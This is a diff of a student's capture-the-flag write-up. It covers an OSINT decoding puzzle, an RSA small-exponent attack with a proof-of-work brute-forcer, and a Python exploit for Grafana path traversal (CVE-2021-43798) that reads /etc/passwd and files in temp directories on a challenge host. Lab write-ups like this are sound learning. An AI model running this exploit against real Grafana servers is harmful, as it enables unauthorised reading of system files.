@@ -10,14 +10,14 @@ I once checked the followers and following of that account as it could also have
 
 After that i went to the comments section where it was written i like these numbes..quite different statement neither related to rowing or anything in that comment the numbers were also hidden so like it was something unsusual and in the hints also we were told that if you find some **number** then look for base<x> encodings.I searched that how can we decode such numbers to get useful texts and then it told me some websites like the cyberchef and dcode.fr in which we just have to paste the text and try different tools to decode our text. I tried many things like converted them to base64 
 
-12668958
-29326
-23627944634268
-3108
-8
-523948
-01050036027972
-87177902339084610664
+12668958  
+29326  
+23627944634268  
+3108  
+8  
+523948  
+01050036027972  
+87177902339084610664  
 
 Finally in one conversion i got : HTTPS WWW INSTAGRAM COM I LIKE ANONYMITY SOMETIMES1212
 
@@ -35,33 +35,128 @@ I started looking again at the original page becuase the post revelaed that page
 
 ## FLAG : 2 
 
+First of all I did *nc 3.109.250.1 5000* which we generally do in such type of challenges. SO everytime i did this, it gave this output : Find a string such that SHA-256 hash of "some string" concatenated with your input starts with the the string "some number". LIke this number ans string changed every time i did netcat, so first of all I searched that what this text want to say, it directed us to do this   
+SHA-256("any string" + X) = a hash that begins with "any number"...our job was to find the string X and we can't predict it also becaause these 2 parameters were getting changed continuously.
+
+So like after doing netcat, when this line comes then we have to find the desired input which fits in that condition and return our answer to the terminal for further evaluation.
+
+To find the answer i learned how to tackle this problem (POW), so i got to know that it can be solved by a python script like this
+
+``` bash
+
+import hashlib
+import itertools
+import string
+
+prefix = "any string"
+
+def find_matching_input():
+    chars = string.ascii_letters + string.digits  # characters to try
+    for length in range(1, 10):  # max length of the suffix
+        for suffix in itertools.product(chars, repeat=length):
+            candidate = prefix + ''.join(suffix)
+            hash_hex = hashlib.sha256(candidate.encode()).hexdigest()
+            if hash_hex.startswith("any number"):
+                print(f"Found! Suffix: {''.join(suffix)}, Hash: {hash_hex}")
+                return
+
+find_matching_input()
 
 
+```
+I opened this script on other terminal and when i did netcat the string and number it gave i filled that in the required places and the hash it gave i returned it back to terminal where i was connected to that ip address. After that it gave me 3 options :  
+1. get first half code  
+2. get second half code   
+3. get flag  
+What do you want ?  
+
+At first I chose 3rd option but there it was asking for an padding- a gave it a random text and it returned a large number to me named ciphertext, nothing understood. I reconnected and did all the above processes again first I went to step 1 there i got this:  
+```bash
+from Crypto.Util.number import bytes_to_long
+from hashlib import sha256
+import random
+import os, sys
+
+m = b"PClub{Fake_Flag}"
+n = 14396996159484935402263047209515591837894561722637754977347763291309469526016654395830492184143403002427443166570907471043582253894111865750271913633299048451358715658977476227178780148897263675642352138870807635707152157265878868071156485130358955177740064371871540690429629376357175922832896148083749207758979817755416407370097422607094461094843394269367378266138773192483991105300836363325123386715060503986689730021660330714714902229408932007554015453954776067969393448087791858215409782993160037667631348054614116602892854843905177862655435919982681383061296616680660139810652785553456917773787057033714145613047
+e = 3
+def options():
+    help_menu = """
+    1. get first half code
+    2. get second half code
+    3. get flag
+    What do you want ?"""
+    while True:
+        print(help_menu)
+        c = input().strip()
+        if c == "1":
+            return 1
+        elif c == "2":
+            return 2
+        elif c == "3":
+            return 3
+        else:
+            print("Please select a valid option!")
+            
+def proof():
+    _x = "abcdefghijklmnopqrstuvwxyzFRLMAOEWJASK"
+    _y = "".join(random.sample(_x, 6))
+    _z = str(random.randint(10000, 99999))
+    print(f'\nFind a string such that SHA-256 hash of "{_y}" concatenated with your input starts with the the string "{_z}".')
+    _u = input().strip()
+    return hashlib.sha256((_y + _u).encode()).hexdigest()[:len(_z)] == _z
+```
+
+and then i went to step 2:  
+
+```bash
+python script to provide that SHA-256 
+
+import hashlib
+import string
+import itertools
+
+prefix = "any string"
+target = "any number"
+
+# Try all combinations of letters up to 6 characters
+for length in range(1, 7):
+    for s in itertools.product(string.ascii_letters + string.digits, repeat=length):
+        suffix = ''.join(s)
+        test = prefix + suffix
+        hashed = hashlib.sha256(test.encode()).hexdigest()
+        if hashed.startswith(target):
+            print("Found:", suffix)
+            exit()
+```
+
+
+
+
+The input i gave was A and based on my input it generated a ciphertext.  
+Padding was computed like this : int(sha256("A").hexdigest(), 16)  
+ciphertext = (flag + padding)^3 mod n
+
+
+
+
+```bash
 from Crypto.Util.number import long_to_bytes
 from hashlib import sha256
 from sympy import integer_nthroot
-
-The input i gave was A and based in my input it generated a ciphertext
-
-
 padding_str = "A"
 padding = int(sha256(padding_str.encode()).hexdigest(), 16)
-
-### Example: replace this with the actual value you get from the server
-ciphertext =134375264724364437942161831944473471609577231135052328479904790691137157510326678355563261590293472140467382405173493233765793>
-  ### <- you’ll get this from the server after option 3
-
-### Cube root
+ciphertext=13437526472436443794216183194447347160957723113505232847990479069113715751032667835556326159029347214046738240517349323376579339793144519501089857384970318231112620230674320376725618594574898447515582301701828064982163779248507095527697306364128341815226008584267419610235729459588088254764002386238546480243365454049088283399975970304654603490352220284084556515691426381488068091196842893160833699337932249423967589908024745716060050685205710240346523500098854446245763658858310473756940098186978928773457853751746351211919809413832487849048839551152542691067398874832632919168455723240839746400644342543999966667121 
+ 
 m_plus_padding, exact = integer_nthroot(ciphertext, 3)
-
-### Subtract padding
+ 
 flag_int = m_plus_padding - padding
 flag = long_to_bytes(flag_int)
 print(flag.decode())
-
-
-
-
+```
+What i understood from this code was this that at first it Computes the padding value from my input and then it takes the cube root of the ciphertext (because exponent is 3). After that it subtracts the padding as shown in the code, and then converts it back to integer. at last it converts the integer back to a string format. 
+ 
+In this we are taking exponent as 3 which is a small number and our message is also small whereas we saw earlier that n was a very large number so in this we could directly take the n-th root as (message)^3 < n so mod n doesn't affect the anwer.
 
 
 **`PClub{RSA_with_low_exponents_is_risky_without_padding}`**
@@ -90,14 +185,14 @@ Grafana CVE-2021-43798 Exploit
 Automatic Path Traversal Attack
     """)
 
-### List of plugin paths to try (from known vulnerable paths)
+```bash
 plugin_paths = [
     "alertlist", "annolist", "barchart", "bargauge", "canvas", "dashlist","gauge", "geomap", "gettingstarted", "grafana-azure-monitor-datasource",
     "graph", "heatmap", "histogram", "logs", "loki", "mssql", "mysql","news", "nodeGraph", "opentsdb", "piechart", "pluginlist", "postgres",
     "prometheus", "stackdriver", "stat", "state-timeline", "status-histor","table", "table-old", "tempo", "testdata", "text", "timeseries",  "welcome", "zipkin"
 ]
 
-### Target file to read
+ 
 target_file = "../../../../../../../../../../etc/passwd"
 
 ### Main exploit function
@@ -119,14 +214,14 @@ def exploit(target_url):
     if not found:  
         print("\n[-] Target does not seem vulnerable or plugin paths blocked.")  
 
-### Entry point
+ 
 if __name__ == "__main__":  
-    banner()  
-    # Put your target URL here  
+    banner()   
     target = "http://13.126.50.182:3000"    
     exploit(target)  
+```
 
-I then understanded the working of such scrits so that i can apply it further although this didn't work but i tried this also.
+I then tried to understand the working of such scrits so that i can apply it further although this code didn't work in particular but i tried this also.
 
 At last after searching more that what to do if these plugins re not working then i got to know that the etc/passwd that i was writing at the end was creating the problem. The hint slipped from my mind that "*the hacker had placed the flag at a temporary location* and when i realized this then i thought to search in the temp files , i might get something useful in those files.
 
@@ -141,7 +236,8 @@ we can go upto lesser directories also be reducing ../ but if we fall short then
 
 And i checked one more thing that it was also working with logs instead of alertlist..i didn't check but it might work with all the plugins.
 
-Out of all these the second one worked it was a valid path and there only the flag was stored so i got the flag.
+Out of all these the second one worked it was a valid path and there only the flag was stored so i got the flag.  
+
 **``PClub{Easy LFI}``**
 
 ---
